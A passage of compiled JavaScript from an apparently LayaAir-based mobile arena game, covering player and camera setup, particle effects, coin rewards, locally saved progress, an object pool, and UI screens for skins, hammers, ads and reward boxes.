                    this.playerAni.bianshen_stand();
                    if (callback) {
                        callback();
                    }
                });
            });
        }
        Load_Player(localY, addSize, parentNode, callback) {
            if (this.player.parent) {
                this.player.removeSelf();
                this.home_scene.addChild(this.player);
            }
            else {
                this.home_scene.addChild(this.player);
            }
            this.player.transform.localScale = new Laya.Vector3(addSize, addSize, addSize);
            this.player.transform.localPosition = new Laya.Vector3(0, localY, 0);
            this.player.transform.localRotationEuler = new Laya.Vector3(-2, 0, 0);
            this.home_Carmera.orthographicVerticalSize = 10;
            this.home_Carmera.transform.localPositionY = 0;
            this.player.transform.localPositionX = -2;
            parentNode.addChild(this.home_scene);
            this.Load_In(callback);
        }
        Load_In(callback) {
            Laya.Tween.to(this.player.transform, { localPositionX: 0 }, 500, null, Laya.Handler.create(this, () => {
                this.playerAni.attack(() => {
                    if (callback) {
                        callback();
                    }
                    Laya.Tween.to(this.player.transform, { localPositionX: 8 }, 500, null);
                    this.gameScene();
                    Laya.timer.once(1200, this, () => {
                        this.loadFun();
                    });
                }, () => {
                    Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ham_hit);
                });
            }));
        }
        loadFun() {
            this.initLand(ConfigMgr.nowLand);
            k7.AppScene.show(Game.GameScene);
            this.persons.addChild(this.player);
            this.game_Scene.active = true;
            this.player.transform.localPosition = new Laya.Vector3(0, 0, 0);
            this.player.transform.localRotationEuler = new Laya.Vector3(0, 0, 0);
            this.player.transform.localScale = new Laya.Vector3(Grow[0].scaling, Grow[0].scaling, Grow[0].scaling);
            Game.GameManager.instance.EnemyManager.RandomEnemy();
            this.player_biao.active = true;
            mvc.send(GameEvt.surplusRefresh, 0);
            Game.GameManager.instance.EnemyManager.matchDisplay(() => {
                let data = { callback: null };
                data.callback = () => {
                    Laya.Tween.to(this.carmera.transform, { localPositionX: 0, localPositionY: (Game.cemaraMin * 0.66 - 0.08), localPositionZ: Game.cemaraMin, localRotationEulerX: -35 }, 800, null, Laya.Handler.create(this, () => {
                        let datas = {
                            callback: null
                        };
                        datas.callback = () => {
                            Game.GameManager.instance.PlayerMove.onLoad();
                            Game.GameManager.instance.EnemyManager.initEnemy();
                            Game.GameManager.instance.PlayerMove.Init();
                            Game.SoundManager.playBGM(Game.SoundManager.soundName.Audio_bgm_game, true);
                        };
                        mvc.send(GameEvt.openFirst, datas);
                    }));
                };
                mvc.send(GameEvt.closematch, data);
            });
        }
        findChild(path, parent) {
            let arr = path.split("/");
            let lastNode = null;
            for (let i = 0; i < arr.length; i++) {
                lastNode = parent.getChildByName(arr[i].toString());
                parent = lastNode;
            }
            return lastNode;
        }
        AINums() {
            let num = 0;
            for (let i = 0; i < this.persons.numChildren; i++) {
                let person = this.persons.getChildAt(i);
                if (person.name == "enemy") {
                    let enemyScript = person.getComponent(Game.EnemyMove);
                    if (enemyScript.isdie == false) {
                        num += 1;
                    }
                }
            }
            ConfigMgr.game_rank = num + 1;
            return num;
        }
        enemyboomPlay(pos) {
            this.enemyboom.transform.localPosition = pos;
            this.enemyboom.particleSystem.play();
            for (let i = 0; i < this.enemyboom.numChildren; i++) {
                let part = this.enemyboom.getChildAt(i);
                part.particleSystem.play();
            }
        }
        boomPlay(pos) {
            this.boom.transform.localPosition = pos;
            this.boom.particleSystem.play();
            for (let i = 0; i < this.boom.numChildren; i++) {
                let part = this.boom.getChildAt(i);
                part.particleSystem.play();
            }
        }
        shuPlay(pos) {
            this.treeboom.transform.localPosition = pos;
            this.treeboom.particleSystem.play();
            for (let i = 0; i < this.treeboom.numChildren; i++) {
                let part = this.treeboom.getChildAt(i);
                part.particleSystem.play();
            }
        }
        GetPos(playerpos) {
            var _out = new Laya.Vector4(0, 0, 0, 0);
            this.carmera.viewport.project(playerpos, this.carmera.projectionViewMatrix, _out);
            let pos = new Laya.Vector2(0, 0);
            pos.x = _out.x / Laya.stage.clientScaleX;
            pos.y = _out.y / Laya.stage.clientScaleY;
            return pos;
        }
        randPoint(r, pos) {
            let rot = Math.floor(Math.random() * 360);
            let randX = r;
            let randFlag = Math.random();
            if (randFlag > 0.5) {
                randX = -1 * randX;
            }
            let ranY = Math.sin(rot * (Math.PI) / 180) * randX;
            let ranX = Math.cos(rot * (Math.PI) / 180) * randX;
            let point = new Laya.Vector2(ranX + pos.x, ranY + pos.y);
            return point;
        }
        createCoin(pos) {
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_coin);
            for (let i = 0; i < 6; i++) {
                let endPos = this.randPoint(2, new Laya.Vector2(pos.x, pos.z));
                let coin = Game.Pool.instance.creatPoolObj("coin", this.game_Scene, pos, Laya.MeshSprite3D);
                coin.transform.localScale = new Laya.Vector3(1, 1, 1);
                let randY = Math.random() * 3 + 1;
                Laya.Tween.to(coin.transform, { localPositionX: endPos.x, localPositionZ: endPos.y }, 1000, Laya.Ease.circOut);
                Laya.Tween.to(coin.transform, { localPositionY: randY }, 500, Laya.Ease.circOut, Laya.Handler.create(this, () => {
                    Laya.Tween.to(coin.transform, { localPositionY: 0 }, 400, Laya.Ease.circOut, Laya.Handler.create(this, () => {
                        Laya.Tween.to(coin.transform, { localPositionX: this.player.transform.localPositionX, localPositionY: 1, localPositionZ: this.player.transform.localPositionZ }, 200, Laya.Ease.circOut, Laya.Handler.create(this, () => {
                            Game.Pool.instance.recoveryObj("coin", coin);
                        }));
                    }));
                }));
            }
        }
        setPlayerSkin(modleName, target) {
            for (let i = 0; i < Skin.length; i++) {
                let names = Skin[i].model;
                let modle = target.getChildByName(names);
                if (modle) {
                    modle.active = false;
                }
            }
            let modle = target.getChildByName(modleName);
            return modle;
        }
        setHammerSkin(modleName, target) {
            let hammerParent = this.findChild("Bip001/Bip001 Pelvis/Bip001 Spine/Bip001 Neck/Bip001 R Clavicle/Bip001 R UpperArm/Bip001 R Forearm/Bip001 R Hand/wuqi", target);
            for (let i = 0; i < Hammer.length; i++) {
                let names = Hammer[i].model;
                let modle = hammerParent.getChildByName(names);
                if (modle) {
                    modle.active = false;
                }
            }
            let modle = hammerParent.getChildByName(modleName);
            return modle;
        }
        initHamer() {
            for (let i = 0; i < Game.Datas.hammerDatas.length; i++) {
                if (Game.Datas.hammerDatas[i] == 2) {
                    let model = this.setHammerSkin(Hammer[i].model, this.player);
                    if (model) {
                        model.active = true;
                    }
                    else {
                        model = this.setHammerSkin(Hammer[0].model, this.player);
                        if (model) {
                            model.active = true;
                        }
                    }
                    break;
                }
            }
        }
        getLandIndex() {
            let index = 0;
            for (let i = Game.Datas.mapLands.length - 1; i >= 0; i--) {
                if (Game.Datas.mapLands[i] == 1) {
                    index = i;
                    break;
                }
            }
            return index;
        }
        initLand(index) {
            for (let i = 0; i < this.lands.numChildren; i++) {
                let land = this.lands.getChildAt(i);
                land.active = false;
            }
            this.lands.getChildAt(index).active = true;
            this.carmera.clearColor = this.skyColors[index];
            this.player_biao.meshRenderer.material.albedoColor = this.biaoColors[index];
        }
    }
    Game.SceneManager = SceneManager;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class ShakeEffect extends Laya.Script {
        constructor() {
            super();
            this.tweens = new Laya.Tween();
            this.pos = [{ x: 5, y: 7 }, { x: -6, y: 7 }, { x: -13, y: 3 }, { x: 3, y: -6 }, { x: -5, y: 5 }, { x: 2, y: -8 }, { x: -8, y: -10 }, { x: 3, y: 10 }, { x: 0, y: 0 }];
            this.index = 0;
            Game.GameManager.instance.ShakeEffect = this;
        }
        onAwake() {
            this.carmera = this.owner;
        }
        shakeFun(duration) {
            this.shake(this.carmera, this.pos[this.index]);
            Laya.timer.once(duration, this, () => {
                this.tweens.clear();
                this.carmera.transform.localPositionX = 0;
                this.carmera.transform.localPositionZ = 0;
            });
        }
        shake(node, p) {
            this.tweens.to(node.transform, { localPositionX: p.x / 100, localPositionZ: p.y / 100 }, 20, null, Laya.Handler.create(this, () => {
                this.index += 1;
                if (this.index >= this.pos.length) {
                    this.index = 0;
                }
                this.shake(node, this.pos[this.index]);
            }));
        }
    }
    Game.ShakeEffect = ShakeEffect;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class Datas {
        constructor() { }
        ;
        static getData() {
            if (!Laya.LocalStorage.getItem("getMaterial")) {
                for (let i = 0; i < this.maxMaterial; i++) {
                    this.getMaterial.push(0);
                }
            }
            else {
                this.getMaterial = JSON.parse(Laya.LocalStorage.getItem("getMaterial"));
            }
            for (let i = 0; i < this.maxMaterial; i++) {
                this.newMaterial.push(0);
            }
            if (!Laya.LocalStorage.getItem("grailNum")) {
                this.grailNum = 0;
            }
            else {
                this.grailNum = Number(Laya.LocalStorage.getItem("grailNum"));
            }
            if (this.getMaterial.length != this.maxMaterial) {
                if ((this.getMaterial.length - this.maxMaterial) > 0) {
                    let num = (this.getMaterial.length - this.maxMaterial);
                    for (let i = 0; i < num; i++) {
                        this.getMaterial.pop();
                    }
                }
                else {
                    let num = (this.maxMaterial - this.getMaterial.length);
                    for (let i = 0; i < num; i++) {
                        this.getMaterial.push(0);
                    }
                }
            }
            if (!Laya.LocalStorage.getItem("skinDatas")) {
                for (let i = 0; i < Skin.length; i++) {
                    if (i == 0) {
                        this.skinDatas.push(1);
                    }
                    else {
                        this.skinDatas.push(0);
                    }
                }
            }
            else {
                this.skinDatas = JSON.parse(Laya.LocalStorage.getItem("skinDatas"));
            }
            if (!Laya.LocalStorage.getItem("hammerDatas")) {
                for (let i = 0; i < Hammer.length; i++) {
                    this.videohammerDatas.push(0);
                    if (i == 0) {
                        this.hammerDatas.push(2);
                    }
                    else {
                        this.hammerDatas.push(0);
                    }
                }
            }
            else {
                this.hammerDatas = JSON.parse(Laya.LocalStorage.getItem("hammerDatas"));
                this.videohammerDatas = JSON.parse(Laya.LocalStorage.getItem("videohammerDatas"));
            }
            if (!Laya.LocalStorage.getItem("first")) {
                this.first = 0;
            }
            else {
                this.first = Number(Laya.LocalStorage.getItem("first"));
            }
            if (!Laya.LocalStorage.getItem("listFirst")) {
                this.listFirst = 0;
            }
            else {
                this.listFirst = Number(Laya.LocalStorage.getItem("listFirst"));
            }
            if (!Laya.LocalStorage.getItem("mapLands")) {
                for (let i = 0; i < Arena.length; i++) {
                    if (i == 0) {
                        this.mapLands.push(1);
                    }
                    else {
                        this.mapLands.push(0);
                    }
                }
            }
            else {
                this.mapLands = JSON.parse(Laya.LocalStorage.getItem("mapLands"));
            }
            if (!Laya.LocalStorage.getItem("nameList")) {
                Game.nameList = 0;
            }
            else {
                Game.nameList = Number(Laya.LocalStorage.getItem("nameList"));
            }
            if (!Laya.LocalStorage.getItem("gameNums")) {
                this.gameNums = 0;
            }
            else {
                this.gameNums = Number(Laya.LocalStorage.getItem("gameNums"));
            }
        }
        static setData() {
            Laya.LocalStorage.setItem("getMaterial", JSON.stringify(this.getMaterial));
            Laya.LocalStorage.setItem("grailNum", String(this.grailNum));
            Laya.LocalStorage.setItem("skinDatas", JSON.stringify(this.skinDatas));
            Laya.LocalStorage.setItem("hammerDatas", JSON.stringify(this.hammerDatas));
            Laya.LocalStorage.setItem("videohammerDatas", JSON.stringify(this.videohammerDatas));
            Laya.LocalStorage.setItem("first", String(this.first));
            Laya.LocalStorage.setItem("mapLands", JSON.stringify(this.mapLands));
        }
        static setHammerSkin(index) {
            for (let i = 0; i < this.hammerDatas.length; i++) {
                if (this.hammerDatas[i] == 2) {
                    this.hammerDatas[i] = 1;
                    break;
                }
            }
            this.hammerDatas[index] = 2;
        }
    }
    Datas.getMaterial = [];
    Datas.newMaterial = [];
    Datas.maxMaterial = 9;
    Datas.grailNum = 0;
    Datas.skinDatas = [];
    Datas.hammerDatas = [];
    Datas.videohammerDatas = [];
    Datas.first = 0;
    Datas.listFirst = 0;
    Datas.mapLands = [];
    Datas.gameNums = 0;
    Game.Datas = Datas;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class GameManager {
        constructor() { }
        static get instance() { if (!this._instance) {
            this._instance = new GameManager();
        } return this._instance; }
        ;
    }
    Game.GameManager = GameManager;
    class ViewManager {
        constructor() { }
        ;
        static showSuccessScene() {
            if (this.iswin)
                return;
            this.iswin = true;
            Laya.timer.once(1000, this, () => {
                this.iswin = false;
            });
            this.rewardData = this.getReward();
            Game.overCoin = this.rewardData.gold;
            k7.AppWindow.show(Game.BoxWindow);
        }
        static showSuccess() {
            Game.fast.showGameSuccessWindow({ type: Game.fast.RewardType.COIN, val: this.rewardData.gold });
        }
        static showGameSuccess() {
            Game.fast.showGameSuccessWindow({ type: Game.fast.RewardType.COIN, val: this.rewardData.gold });
        }
        static getReward() {
            let reward = {
                grail: 0,
                gold: 0,
                item: 0
            };
            for (let index = 0; index < RewardArena.length; index++) {
                if (RewardArena[index].name == ConfigMgr.Map_Name && Number(RewardArena[index].ranking) == (ConfigMgr.Match_Num + 1)) {
                    reward.grail = RewardArena[index].grail;
                    let goldstr = RewardArena[index].gold;
                    let goldArr = goldstr.split(',');
                    let maxGold = Number(goldArr[0]);
                    let minGold = Number(goldArr[1]);
                    reward.gold = Math.floor(Math.random() * (maxGold - minGold)) + minGold;
                    reward.item = RewardArena[index].item;
                    break;
                }
            }
            return reward;
        }
    }
    ViewManager.iswin = false;
    Game.ViewManager = ViewManager;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class Pool {
        constructor() {
            this.pools = [];
            this.objs = [];
            this.types = [];
            this.treeNames = ["tree1", "tree2", "zhiwu1", "mudi"];
        }
        static get instance() { if (!this._instance) {
            this._instance = new Pool();
        } return this._instance; }
        setInPool(obj, type) {
            this.objs.push(obj);
            obj.removeSelf();
            let _setPool = [];
            this.pools.push(_setPool);
            if (type == "tree") {
                let names = obj.getChildAt(0).name;
                this.types.push(names);
            }
            else {
                this.types.push(type);
            }
        }
        creatPoolObj(objType, _node, pos, type = Laya.MeshSprite3D) {
            if (objType == "tree") {
                objType = ConfigMgr.obstacleName;
                console.log(_node.name);
            }
            let id = 0;
            id = this.getPoolIndex(objType);
            if (id == null) {
                console.warn("对象池中不存在要创建的对象，请先把对象放入池中");
                return;
            }
            let obj = null;
            if (this.pools[id].length > 0) {
                obj = this.pools[id].pop();
            }
            else {
                obj = type.instantiate(this.objs[id]);
            }
            _node.addChild(obj);
            obj.transform.position = pos;
            return obj;
        }
        recoveryObj(objType, obj) {
            let id = 0;
            if (objType == "tree") {
                objType = obj.getChildAt(0).name;
            }
            id = this.getPoolIndex(objType);
            if (id == null) {
                console.warn("对象池中不存在要创建的对象，请先把对象放入池中");
                return;
            }
            if (obj) {
                obj.removeSelf();
                this.pools[id].push(obj);
            }
        }
        getPoolIndex(type) {
            let typeIndex = null;
            for (let i = 0; i < this.types.length; i++) {
                if (this.types[i] == type) {
                    typeIndex = i;
                    break;
                }
            }
            return typeIndex;
        }
    }
    Game.Pool = Pool;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class AddWindow extends k7.AppWindow {
        constructor() {
            super("add", "Game");
        }
        onEvent() {
        }
        bindChild() {
            this.add_bt = this.getButton("n6");
            this.close_bt = this.getButton("n1");
            this.close_bt2 = this.getButton("n10");
        }
        onClickButton(btn) {
            switch (btn) {
                case this.add_bt:
                    Game.PlatAdUtil.installShortcut(() => {
                        this.hide();
                        Game.fast.ecoProxy.addCoin(100);
                        Game.MultiPlatforms.showToast("Get Coins 100");
                    });
                    break;
                case this.close_bt:
                    this.hide();
                    break;
                case this.close_bt2:
                    this.hide();
                    break;
            }
        }
        refreshUi() {
        }
        onShown() {
        }
        onHide() {
        }
    }
    Game.AddWindow = AddWindow;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class BookScene extends k7.AppScene {
        constructor() {
            super("book", "Game");
            this.selectSkin = 0;
            this.selectHammer = -1;
            this.nowList = 0;
            this._eventList = [
                GameEvt.BookCoinRefresh,
            ];
            this.disX = 0;
        }
        onEvent(evt, data) {
            switch (evt) {
                case GameEvt.BookCoinRefresh:
                    this.coinLabel.text = "" + Game.fast.ecoProxy.getCoin();
                    break;
            }
        }
        bindChild() {
            this.back_bt = this.getButton("n21");
            this.scenePos = this.getComp("n28");
            this.bookList = this.getList("n8");
            this.tabCom = this.getComboBox("n13");
            this.compose1 = this.getLoader("n26");
            this.compose2 = this.getLoader("n27");
            this.role_bt = this.getButton("n17");
            this.hammer_bt = this.getButton("n19");
            this.eco = this.getComp("eco");
            this.coinLabel = this.getLabel("eco.coin.title");
            this.scenePos.on(Laya.Event.MOUSE_DOWN, this, this.touchOn);
            this.scenePos.on(Laya.Event.MOUSE_MOVE, this, this.touchMove);
            this.scenePos.on(Laya.Event.MOUSE_UP, this, this.touchEnd);
            this.bookList.on(Laya.Event.MOUSE_UP, this, this.resumeList);
            this.bookList.on(Laya.Event.MOUSE_OUT, this, this.resumeList);
            this.bookList.on(Laya.Event.MOUSE_OVER, this, this.resumeList);
            for (let i = 0; i < this.eco.numChildren; i++) {
                if (i != 0) {
                    this.eco.getChildAt(i).visible = false;
                }
            }
            if (ConfigMgr.longPhone == 1) {
                this.back_bt.y += 150;
            }
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.isFullScreen = ConfigMgr.fixedWidth == 1;
                this.isCenter = true;
                this.tabCom.x = 328;
                this.tabCom.getChild("n15").visible = false;
                this.tabCom.getChild("n16").visible = false;
                this.bookList.off(Laya.Event.MOUSE_UP, this, this.resumeList);
                this.bookList.off(Laya.Event.MOUSE_OUT, this, this.resumeList);
                this.bookList.off(Laya.Event.MOUSE_OVER, this, this.resumeList);
                this.bookList.on(fairygui.Events.SCROLL, this, this.resumeList);
            }
        }
        onClickButton(btn) {
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "BookScene",
            });
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            switch (btn) {
                case this.back_bt:
                    Game.fast.showHomeScene();
                    break;
                case this.role_bt:
                    if (this.nowList != 0) {
                        this.role_bt.getController("button").selectedIndex = 1;
                        this.hammer_bt.getController("button").selectedIndex = 0;
                        this.getController("c1").selectedIndex = 0;
                        this.nowList = 0;
                        if (this.selectSkin >= 12) {
                            this.bookList.scrollPane.percX = 1;
                        }
                        else {
                            this.bookList.scrollPane.percX = 0;
                        }
                        this.clearList(22);
                        this.bookList.numItems = 22;
                        this.selectRefresh(this.selectSkin);
                    }
                    break;
                case this.hammer_bt:
                    if (this.nowList != 1) {
                        this.role_bt.getController("button").selectedIndex = 0;
                        this.hammer_bt.getController("button").selectedIndex = 1;
                        this.getController("c1").selectedIndex = 1;
                        this.nowList = 1;
                        this.selectHammer = -1;
                        for (let i = 0; i < Game.Datas.hammerDatas.length; i++) {
                            if (Game.Datas.hammerDatas[i] == 2) {
                                if (i >= 12) {
                                    this.bookList.scrollPane.percX = 1;
                                }
                                else {
                                    this.bookList.scrollPane.percX = 0;
                                }
                                break;
                            }
                        }
                        this.clearList(13);
                        this.bookList.numItems = 13;
                        this.selectRefresh(this.selectSkin);
                        Game.GameManager.instance.SceneManager.initHamer();
                    }
                    break;
            }
        }
        refreshUi() {
        }
        onShown() {
            Game.PlatAdUtil.showBannerAd();
            Laya.timer.frameOnce(1, this, () => {
                let num = this.scenePos._parent._height - 1280;
                let localY = (0.5 / 280) * num + 2;
                let addSize = 1.5 - num / 560;
                Game.GameManager.instance.SceneManager.home_Player(addSize, localY, this.scenePos.displayObject);
            });
            this.nowList = 0;
            this.selectSkin = Game.nowSkinIndex;
            this.clearList(22);
            this.bookList.numItems = 22;
            if (this.selectSkin >= 12) {
                this.tabCom.getController("c1").selectedIndex = 1;
            }
            else {
                this.tabCom.getController("c1").selectedIndex = 0;
            }
            this.selectRefresh(this.selectSkin);
            this.role_bt.getController("button").selectedIndex = 1;
            this.hammer_bt.getController("button").selectedIndex = 0;
            this.getController("c1").selectedIndex = 0;
            this.selectHammer = -1;
            this.coinLabel.text = "" + Game.fast.ecoProxy.getCoin();
            k7.xsdk.agentManager.getAnalyticsGroup().onWindowShow({
                window_name: "BookScene",
                window_path: "fairy",
            });
            if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                if (Game.gameSwitch == 1) {
                    Laya.timer.once(1000, this, () => {
                        Game.PlatAdUtil.showInterAd();
                    });
                }
            }
        }
        onHide() {
            this.nowList = 0;
            Game.PlatAdUtil.hideBannerAd();
            let model = Game.GameManager.instance.SceneManager.setPlayerSkin(Skin[Game.nowSkinIndex].model, Game.GameManager.instance.SceneManager.player);
            if (model) {
                model.active = true;
            }
            else {
                Game.GameManager.instance.SceneManager.setPlayerSkin(Skin[0].model, Game.GameManager.instance.SceneManager.player).active = true;
            }
            Game.GameManager.instance.SceneManager.initHamer();
        }
        clearList(num) {
            this.bookList.removeChildrenToPool();
            for (let i = 0; i < num; i++) {
                this.bookList.addItemFromPool("ui://il6pkd2dp1mc6k");
            }
        }
        touchOn() {
            this.disX = this.scenePos.displayObject.mouseX;
        }
        touchMove() {
            let offsetX = this.scenePos.displayObject.mouseX - this.disX;
            Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY += offsetX;
            if (Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY > 360) {
                Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY = 0;
            }
            else if (Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY < 0) {
                Game.GameManager.instance.SceneManager.player.transform.localRotationEulerY = 360;
            }
            this.disX = this.scenePos.displayObject.mouseX;
        }
        touchEnd() {
            this.disX = 0;
        }
        onListRenderer(items, index) {
            let icon = items.getLoader("icon");
            if (this.nowList == 0) {
                icon.url = "ui://icon/" + Skin[index].icon;
                if (this.selectSkin == index) {
                    items.getController("c1").selectedIndex = 1;
                }
                else {
                    items.getController("c1").selectedIndex = 0;
                }
                items.getController("c2").selectedIndex = 0;
            }
            else {
                icon.url = "ui://icon/" + Hammer[index].icon;
                if (this.selectHammer == index) {
                    items.getController("c3").selectedIndex = 1;
                }
                else {
                    items.getController("c3").selectedIndex = 0;
                }
                if (Game.Datas.hammerDatas[index] == 2) {
                    items.getController("c2").selectedIndex = 0;
                    items.getController("c1").selectedIndex = 1;
                }
                else if (Game.Datas.hammerDatas[index] == 1) {
                    items.getController("c2").selectedIndex = 0;
                    items.getController("c1").selectedIndex = 0;
                }
                else {
                    items.getController("c1").selectedIndex = 0;
                    if (Hammer[index].get == 1) {
                        items.getController("c2").selectedIndex = 3;
                        items.getLabel("n34.title").text = Hammer[index].gold.toString();
                        items.getButton("n34", () => {
                            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
                            if (Game.fast.ecoProxy.checkCoin(Hammer[index].gold)) {
                                Game.fast.ecoProxy.addCoin(-1 * Hammer[index].gold);
                                Game.Datas.setHammerSkin(index);
                                Game.Datas.setData();
                                this.coinLabel.text = "" + Game.fast.ecoProxy.getCoin();
                                this.bookList.numItems = 13;
                            }
                        });
                    }
                    else if (Hammer[index].get == 2) {
                        items.getController("c2").selectedIndex = 2;
                        items.getLabel("n34.title").text = Game.Datas.videohammerDatas[index] + "/" + Hammer[index].adNum;
                        items.getButton("n34", () => {
                            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
                            Game.rpMgr.getReward(Game.RewardPointId.hammerShop, () => {
                                Game.Datas.videohammerDatas[index] += 1;
                                if (Game.Datas.videohammerDatas[index] >= Hammer[index].adNum) {
                                    Game.Datas.setHammerSkin(index);
                                }
                                else {
                                    Game.fast.ecoProxy.addCoin(50);
                                    Game.MultiPlatforms.showToast("Get Coins： 50");
                                    this.coinLabel.text = "" + Game.fast.ecoProxy.getCoin();
                                }
                                Game.Datas.setData();
                                this.bookList.numItems = 13;
                            }, null);
                        });
                    }
                    else if (Hammer[index].get == 3) {
                        items.getController("c2").selectedIndex = 4;
                        items.getLabel("n36").text = "Check";
                    }
                    else if (Hammer[index].get == 4) {
                        items.getController("c2").selectedIndex = 4;
                        items.getLabel("n36").text = "lv" + Hammer[index].arenaLevel;
                    }
                }
            }
        }
        onClickItem(item) {
            if (this.nowList == 0) {
                if (this.selectSkin != this.bookList.selectedIndex) {
                    this.selectSkin = this.bookList.selectedIndex;
                    this.selectRefresh(this.selectSkin);
                    this.bookList.numItems = 22;
                }
            }
            else {
                if (Game.Datas.hammerDatas[this.bookList.selectedIndex] == 1) {
                    Game.Datas.setHammerSkin(this.bookList.selectedIndex);
                    this.selectRefresh(this.bookList.selectedIndex);
                    this.selectHammer = -1;
                }
                else if (Game.Datas.hammerDatas[this.bookList.selectedIndex] == 0) {
                    if (this.selectHammer != this.bookList.selectedIndex) {
                        this.selectHammer = this.bookList.selectedIndex;
                        this.selectRefresh(this.selectHammer);
                    }
                }
                else {
                    this.selectHammer = -1;
                    this.selectRefresh(this.bookList.selectedIndex);
                }
                this.bookList.numItems = 13;
            }
        }
        selectRefresh(selectIndex) {
            if (this.nowList == 0) {
                let model = Game.GameManager.instance.SceneManager.setPlayerSkin(Skin[selectIndex].model, Game.GameManager.instance.SceneManager.player);
                if (model) {
                    model.active = true;
                }
                else {
                    Game.GameManager.instance.SceneManager.player.getChildByName("player1").active = true;
                }
                let skin1 = this.getItemSkin(Skin[selectIndex].item1);
                let skin2 = this.getItemSkin(Skin[selectIndex].item2);
                if (Game.Datas.skinDatas[selectIndex] != 1) {
                    skin1 = "";
                    skin2 = "";
                }
                if (skin1 == "") {
                    this.compose1.url = "ui://peq2rr6twkl345";
                }
                else {
                    this.compose1.url = "ui://icon/" + skin1;
                }
                if (skin2 == "") {
                    this.compose2.url = "ui://peq2rr6twkl345";
                }
                else {
                    this.compose2.url = "ui://icon/" + skin2;
                }
            }
            else {
                let model = Game.GameManager.instance.SceneManager.setHammerSkin(Hammer[selectIndex].model, Game.GameManager.instance.SceneManager.player);
                if (model) {
                    model.active = true;
                }
                else {
                    Game.GameManager.instance.SceneManager.setHammerSkin(Hammer[0].model, Game.GameManager.instance.SceneManager.player).active = true;
                }
            }
        }
        resumeList() {
            if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
                this.tabCom.getController("c1").selectedIndex = this.bookList.scrollPane.percX > 0.5 ? 1 : 0;
                return;
            }
            if (this.bookList.scrollPane.percX > 0.3) {
                Laya.Tween.to(this.bookList.scrollPane, { percX: 1 }, 200, null);
                this.tabCom.getController("c1").selectedIndex = 1;
            }
            else {
                Laya.Tween.to(this.bookList.scrollPane, { percX: 0 }, 200, null);
                this.tabCom.getController("c1").selectedIndex = 0;
            }
        }
        getItemSkin(itemName) {
            let skinurl = "";
            for (let i = 0; i < Item.length; i++) {
                if (Item[i].id == itemName) {
                    skinurl = Item[i].icon;
                    break;
                }
            }
            return skinurl;
        }
    }
    Game.BookScene = BookScene;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class BoxWindow extends k7.AppWindow {
        constructor() {
            super("box", "Game");
            this.rateArr = [];
            this.finishTime = 0;
            this.isbanner = false;
            this.overGames = 0;
            this.nowGames = 0;
            this.isloadbanner = false;
            this.isopen = false;
            this.new1 = 0;
            this.new2 = 0;
            this.getrewardnew1 = 0;
            this.getrewardnew2 = 0;
            this.gameBoxIndex = 0;
        }
        onEvent() {
        }
        bindChild() {
            this.box_bt = this.getButton("n31");
            this.again_bt = this.getButton("n38");
            this.rewardList = this.getComp("n37");
            this.coinLabel = this.getLabel("n53.title");
            this.rank1Label = this.getLabel("n55.n27");
            this.rank2Label = this.getLabel("n25.n27");
            this.eggBar = this.getProgressBar("n60");
            this.eggBtn = this.getButton("n59");
            let allMaterial = 0;
            for (let index = 0; index < Game.Datas.maxMaterial; index++) {
                allMaterial += Item[index].rarity;
            }
            let nowRate = 0;
            for (let i = 0; i < Game.Datas.maxMaterial; i++) {
                nowRate += Item[i].rarity;
                this.rateArr.push(nowRate / allMaterial);
            }
            ;
        }
        onClickButton(btn) {
            k7.xsdk.agentManager.getAnalyticsGroup().onButtonClick({
                button_name: String(btn.name),
                button_path: "BoxWindow",
            });
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ui_click);
            switch (btn) {
                case this.eggBtn:
                    let value = (Math.floor(Math.random() * 80) + 70) / 350 * 100;
                    ;
                    this.eggBar.value += value;
                    if (this.isopen) {
                        if (this.eggBar.value >= this.finishTime && this.isbanner == false) {
                            this.isbanner = true;
                            if (Game.platMgr.plat.platType == Game.PlatType.wx) {
                                if (this.isloadbanner) {
                                    Game.PlatAdUtil.showBannerAd();
                                }
                                else {
                                    if (Game.gamescustom) {
                                        Game.gamescustom.show();
                                    }
                                }
                            }
                            else if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                                Game.PlatAdUtil.showBannerAd();
                            }
                            Laya.timer.once(1000, this, () => {
                                this.getTransition("t1").play(Laya.Handler.create(this, () => {
                                    Laya.timer.once(1000, this, () => {
                                        Game.ViewManager.showSuccess();
                                        this.hide();
                                    });
                                }));
                                if (Game.platMgr.plat.platType == Game.PlatType.wx) {
                                    if (this.isloadbanner) {
                                        Game.PlatAdUtil.hideBannerAd();
                                        this.rewardFirtUI1();
                                    }
                                    else {
                                        if (Game.gamescustom) {
                                            Game.gamescustom.destroy();
                                        }
                                        this.rewardFirtUI2();
                                    }
                                    Game.gamescustom = Game.MultiPlatforms.createCacheCustom();
                                }
                                else if (Game.platMgr.plat.platType == Game.PlatType.mz) {
                                    this.rewardFirtUI1();
                                }
                            });
                        }
                    }
                    else {
                        if (this.eggBar.value >= this.finishTime && this.isbanner == false) {
                            this.isbanner = true;
                            Laya.timer.once(1000, this, () => {
                                this.getTransition("t1").play(Laya.Handler.create(this, () => {
                                    Laya.timer.once(1000, this, () => {
                                        Game.ViewManager.showSuccess();
                                        this.hide();
                                    });
                                }));
                            });
                        }
                    }
                    break;
            }
        }
        refreshUi() {
        }
        resumeValue() {
            if (this.eggBar.value >= 0) {
                let num = this.eggBar.value;
                let resume = 5 / 350 * 100;
                if (num - resume >= 0) {
